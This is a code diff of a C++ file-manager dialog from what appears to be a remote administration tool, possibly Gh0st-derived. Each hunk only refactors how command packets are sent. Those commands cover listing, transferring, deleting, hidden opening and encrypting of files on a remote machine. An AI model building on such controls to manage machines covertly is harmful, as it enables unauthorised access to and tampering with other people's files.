@@ -468,7 +468,7 @@ void CFileManagerDlg::FixedRemoteDriveList()
     SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2, NULL, SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
 
     BYTE bPacket = COMMAND_FILE_GETNETHOOD;
-    m_iocpServer->Send2Client(m_ContextObject, &bPacket, 1);
+    m_ContextObject->Send2Client(&bPacket, 1);
 }
 
 void CFileManagerDlg::fixNetHood(BYTE* pbuffer, int buffersize)
@@ -717,7 +717,7 @@ void CFileManagerDlg::GetRemoteFileList(CString directory)
 
     bPacket[0] = COMMAND_LIST_FILES;
     memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), PacketSize - 1);
-    m_iocpServer->Send2Client(m_ContextObject, bPacket, PacketSize);
+    m_ContextObject->Send2Client(bPacket, PacketSize);
     LocalFree(bPacket);
 
     m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
@@ -744,7 +744,7 @@ void CFileManagerDlg::OnDblclkListRemote(NMHDR* pNMHDR, LRESULT* pResult)
             BYTE* bPacket = (BYTE*)LocalAlloc(LPTR, PacketSize);
             bPacket[0] = COMMAND_FILE_GETINFO;
             memcpy(bPacket + 1, filename.GetBuffer(0), PacketSize - 1);
-            m_iocpServer->Send2Client(m_ContextObject, bPacket, PacketSize);
+            m_ContextObject->Send2Client(bPacket, PacketSize);
             LocalFree(bPacket);
         }
         return;
@@ -769,7 +769,7 @@ void CFileManagerDlg::OnDblclkListRemotedriver(NMHDR* pNMHDR, LRESULT* pResult)
     }
     if (directory.Compare(_T("最近")) == 0) {
         BYTE byToken = COMMAND_FILE_RECENT;
-        m_iocpServer->Send2Client(m_ContextObject, &byToken, 1);
+        m_ContextObject->Send2Client(&byToken, 1);
         return;
     }
     m_Remote_Path = directory;
@@ -779,7 +779,7 @@ void CFileManagerDlg::OnDblclkListRemotedriver(NMHDR* pNMHDR, LRESULT* pResult)
 
     bPacket[0] = COMMAND_LIST_FILES;
     memcpy(bPacket + 1, directory.GetBuffer(0), PacketSize - 1);
-    m_iocpServer->Send2Client(m_ContextObject, bPacket, PacketSize);
+    m_ContextObject->Send2Client(bPacket, PacketSize);
     LocalFree(bPacket);
 
     m_Remote_Directory_ComboBox.InsertString(0, directory);
@@ -937,7 +937,7 @@ void CFileManagerDlg::OnRemoteView()
 void CFileManagerDlg::OnRemoteRecent()
 {
     BYTE byToken = COMMAND_FILE_RECENT;
-    m_iocpServer->Send2Client(m_ContextObject, &byToken, 1);
+    m_ContextObject->Send2Client(&byToken, 1);
 }
 
 void CFileManagerDlg::OnRemoteDesktop()
@@ -1131,7 +1131,7 @@ BOOL CFileManagerDlg::SendDownloadJob()
 
     // 文件偏移，续传时用
     memcpy(bPacket + 1, file.GetBuffer(0), (file.GetLength() + 1) * sizeof(TCHAR));
-    m_iocpServer->Send2Client(m_ContextObject, bPacket, nPacketSize);
+    m_ContextObject->Send2Client(bPacket, nPacketSize);
     LocalFree(bPacket);
 
     // 从下载任务列表中删除自己
@@ -1193,7 +1193,7 @@ BOOL CFileManagerDlg::SendUploadJob()
     memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
     memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
     memcpy(bPacket + 9, fileRemote.GetBuffer(0), (fileRemote.GetLength() + 1) * sizeof(TCHAR));
-    m_iocpServer->Send2Client(m_ContextObject, bPacket, nPacketSize);
+    m_ContextObject->Send2Client(bPacket, nPacketSize);
     LocalFree(bPacket);
 
     // 从下载任务列表中删除自己
@@ -1221,7 +1221,7 @@ BOOL CFileManagerDlg::SendDeleteJob()
 
     // 文件偏移，续传时用
     memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);
-    m_iocpServer->Send2Client(m_ContextObject, bPacket, nPacketSize);
+    m_ContextObject->Send2Client(bPacket, nPacketSize);
     LocalFree(bPacket);
 
     // 从下载任务列表中删除自己
@@ -1376,7 +1376,7 @@ void CFileManagerDlg::CreateLocalRecvFile()
         SendStop(TRUE);
     else {
         // 发送继续传输文件的token,包含文件续传的偏移
-        m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
+        m_ContextObject->Send2Client(bToken, sizeof(bToken));
     }
 }
 
@@ -1439,7 +1439,7 @@ void CFileManagerDlg::WriteLocalRecvFile()
         bToken[0] = COMMAND_CONTINUE;
         memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
         memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
-        m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
+        m_ContextObject->Send2Client(bToken, sizeof(bToken));
     }
 }
 
@@ -1534,13 +1534,13 @@ void CFileManagerDlg::EndRemoteDeleteFile()
 void CFileManagerDlg::SendException()
 {
     BYTE	bBuff = COMMAND_FILE_EXCEPTION;
-    m_iocpServer->Send2Client(m_ContextObject, &bBuff, 1);
+    m_ContextObject->Send2Client(&bBuff, 1);
 }
 
 void CFileManagerDlg::SendContinue()
 {
     BYTE	bBuff = COMMAND_CONTINUE;
-    m_iocpServer->Send2Client(m_ContextObject, &bBuff, 1);
+    m_ContextObject->Send2Client(&bBuff, 1);
 }
 
 void CFileManagerDlg::SendStop(BOOL bIsDownload)
@@ -1552,7 +1552,7 @@ void CFileManagerDlg::SendStop(BOOL bIsDownload)
     BYTE	bBuff[2];
     bBuff[0] = COMMAND_STOP;
     bBuff[1] = bIsDownload;
-    m_iocpServer->Send2Client(m_ContextObject, bBuff, sizeof(bBuff));
+    m_ContextObject->Send2Client(bBuff, sizeof(bBuff));
 }
 
 void CFileManagerDlg::ShowProgress()
@@ -1668,7 +1668,7 @@ void CFileManagerDlg::SendTransferMode()
     BYTE bToken[5];
     bToken[0] = COMMAND_SET_TRANSFER_MODE;
     memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
-    m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
+    m_ContextObject->Send2Client(bToken, sizeof(bToken));
 }
 
 void CFileManagerDlg::SendFileData()
@@ -1707,7 +1707,7 @@ void CFileManagerDlg::SendFileData()
 
     if (nNumberOfBytesRead > 0) {
         int	nPacketSize = nNumberOfBytesRead + nHeadLength;
-        m_iocpServer->Send2Client(m_ContextObject, lpBuffer, nPacketSize);
+        m_ContextObject->Send2Client(lpBuffer, nPacketSize);
     }
     LocalFree(lpBuffer);
 }
@@ -1759,7 +1759,7 @@ void CFileManagerDlg::OnRemoteNewFolder()
         LPBYTE	lpBuffer = new BYTE[nPacketSize];
         lpBuffer[0] = COMMAND_CREATE_FOLDER;
         memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
-        m_iocpServer->Send2Client(m_ContextObject, lpBuffer, nPacketSize);
+        m_ContextObject->Send2Client(lpBuffer, nPacketSize);
         SAFE_DELETE_AR(lpBuffer);
     }
 }
@@ -1792,7 +1792,7 @@ void CFileManagerDlg::OnEndLabelEditListRemote(NMHDR* pNMHDR, LRESULT* pResult)
         memcpy(lpBuffer + 1, strExistingFileName.GetBuffer(0), (strExistingFileName.GetLength() + 1) * sizeof(TCHAR));
         memcpy(lpBuffer + 1 + (strExistingFileName.GetLength() + 1) * sizeof(TCHAR),
                strNewFileName.GetBuffer(0), (strNewFileName.GetLength() + 1) * sizeof(TCHAR));
-        m_iocpServer->Send2Client(m_ContextObject, lpBuffer, nPacketSize);
+        m_ContextObject->Send2Client(lpBuffer, nPacketSize);
         LocalFree(lpBuffer);
     }
     *pResult = 1;
@@ -1802,7 +1802,7 @@ void CFileManagerDlg::OnDelete()
 {
     BYTE	bBuff;
     bBuff = COMMAND_FILE_NO_ENFORCE;
-    m_iocpServer->Send2Client(m_ContextObject, &bBuff, sizeof(bBuff));
+    m_ContextObject->Send2Client(&bBuff, sizeof(bBuff));
     OnRemoteDelete();
 }
 
@@ -1810,7 +1810,7 @@ void CFileManagerDlg::OnDeleteEnforce()
 {
     BYTE	bBuff;
     bBuff = COMMAND_FILE_ENFOCE;
-    m_iocpServer->Send2Client(m_ContextObject, &bBuff, sizeof(bBuff));
+    m_ContextObject->Send2Client(&bBuff, sizeof(bBuff));
     OnRemoteDelete();
 }
 
@@ -1846,7 +1846,7 @@ void CFileManagerDlg::OnRemoteOpenShow()
     lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
     lpPacket[1] = m_bUseAdmin;
     memcpy(lpPacket + 2, str.GetBuffer(0), nPacketLength - 2);
-    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
+    m_ContextObject->Send2Client(lpPacket, nPacketLength);
     LocalFree(lpPacket);
 }
 
@@ -1864,7 +1864,7 @@ void CFileManagerDlg::OnRemoteOpenHide()
     lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
     lpPacket[1] = m_bUseAdmin;
     memcpy(lpPacket + 2, str.GetBuffer(0), nPacketLength - 2);
-    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
+    m_ContextObject->Send2Client(lpPacket, nPacketLength);
     LocalFree(lpPacket);
 }
 
@@ -1881,7 +1881,7 @@ void CFileManagerDlg::OnRemoteInfo()
     LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
     lpPacket[0] = COMMAND_FILE_INFO;
     memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
-    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
+    m_ContextObject->Send2Client(lpPacket, nPacketLength);
     LocalFree(lpPacket);
 }
 
@@ -1900,7 +1900,7 @@ void CFileManagerDlg::OnRemoteEncryption()
     lpPacket[0] = COMMAND_FILE_Encryption;
 
     memcpy(lpPacket + 1, strA.GetBuffer(0), nPacketLength - 1);
-    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
+    m_ContextObject->Send2Client(lpPacket, nPacketLength);
     LocalFree(lpPacket);
 }
 
@@ -1919,7 +1919,7 @@ void CFileManagerDlg::OnRemoteDecrypt()
     lpPacket[0] = COMMAND_FILE_Decrypt;
 
     memcpy(lpPacket + 1, strA.GetBuffer(0), nPacketLength - 1);
-    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
+    m_ContextObject->Send2Client(lpPacket, nPacketLength);
     LocalFree(lpPacket);
 }
 
@@ -1940,7 +1940,7 @@ void CFileManagerDlg::OnRemoteCopyFile()
     lpPacket[0] = COMMAND_FILE_CopyFile;
 
     memcpy(lpPacket + 1, file.GetBuffer(0), nPacketLength - 1);
-    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
+    m_ContextObject->Send2Client(lpPacket, nPacketLength);
     LocalFree(lpPacket);
     ShowMessage(_T("准备粘贴"));
 }
@@ -1951,7 +1951,7 @@ void CFileManagerDlg::OnRemotePasteFile()
     LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
     lpPacket[0] = COMMAND_FILE_PasteFile;
     memcpy(lpPacket + 1, m_Remote_Path.GetBuffer(0), nPacketLength - 1);
-    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
+    m_ContextObject->Send2Client(lpPacket, nPacketLength);
     LocalFree(lpPacket);
 }
 
@@ -1975,7 +1975,7 @@ void CFileManagerDlg::OnRemotezip()
     lpPacket[0] = COMMAND_FILE_zip;
 
     memcpy(lpPacket + 1, file.GetBuffer(0), nPacketLength - 1);
-    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
+    m_ContextObject->Send2Client(lpPacket, nPacketLength);
     LocalFree(lpPacket);
 
     ShowMessage(_T("开始压缩，不要关闭窗口，其他操作继续"));
@@ -1984,7 +1984,7 @@ void CFileManagerDlg::OnRemotezip()
 void CFileManagerDlg::OnRemotezipstop()
 {
     BYTE	lpPacket = COMMAND_FILE_zip_stop;
-    m_iocpServer->Send2Client(m_ContextObject, &lpPacket, 1);
+    m_ContextObject->Send2Client(&lpPacket, 1);
 }
 
 void CFileManagerDlg::OnRclickListRemotedriver(NMHDR* pNMHDR, LRESULT* pResult)
@@ -2033,7 +2033,7 @@ void CFileManagerDlg::OnRclickListRemotedriver(NMHDR* pNMHDR, LRESULT* pResult)
         BYTE* lpbuffer = new BYTE[sizeof(SEARCH) + 1];
         lpbuffer[0] = COMMAND_FILE_SEARCHPLUS_LIST;
         memcpy(lpbuffer + 1, &S_search, sizeof(SEARCH));
-        m_iocpServer->Send2Client(m_ContextObject, (LPBYTE)lpbuffer, sizeof(SEARCH) + 1);
+        m_ContextObject->Send2Client((LPBYTE)lpbuffer, sizeof(SEARCH) + 1);
         SAFE_DELETE_AR(lpbuffer);
         SetWindowPos(NULL, 0, 0, 830, 830, SWP_NOMOVE);
     }
@@ -2308,7 +2308,7 @@ void CFileManagerDlg::OnCompress()
     LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
     lpPacket[0] = COMMAND_COMPRESS_FILE_PARAM;
     memcpy(lpPacket + 1, strMsg.GetBuffer(0), nPacketLength - 1);
-    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
+    m_ContextObject->Send2Client(lpPacket, nPacketLength);
     LocalFree(lpPacket);
 }
 
@@ -2335,7 +2335,7 @@ void CFileManagerDlg::OnUncompress()
     LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
     lpPacket[0] = COMMAND_COMPRESS_FILE_PARAM;
     memcpy(lpPacket + 1, strMsg.GetBuffer(0), nPacketLength - 1);
-    m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
+    m_ContextObject->Send2Client(lpPacket, nPacketLength);
     LocalFree(lpPacket);
 }
 
@@ -2368,7 +2368,7 @@ void CFileManagerDlg::OnBtnSearch()
     LPBYTE	lpBuffer = new BYTE[nPacketSize];
     lpBuffer[0] = COMMAND_SEARCH_FILE;
     memcpy(lpBuffer + 1, &mFileSearchPacket, sizeof(mFileSearchPacket));
-    m_iocpServer->Send2Client(m_ContextObject, lpBuffer, nPacketSize);
+    m_ContextObject->Send2Client(lpBuffer, nPacketSize);
     SAFE_DELETE_AR(lpBuffer);
     // 设置按钮状态
     m_BtnSearch.SetWindowText(_T("正在搜索..."));
@@ -2441,7 +2441,7 @@ void CFileManagerDlg::OnBnClickedSearchStop()
     GetDlgItem(ID_SEARCH_STOP)->EnableWindow(FALSE);
     // TODO: Add your command handler code here
     BYTE  bToken = COMMAND_FILES_SEARCH_STOP;
-    m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
+    m_ContextObject->Send2Client(&bToken, sizeof(BYTE));
 }
 
 //显示搜索结果
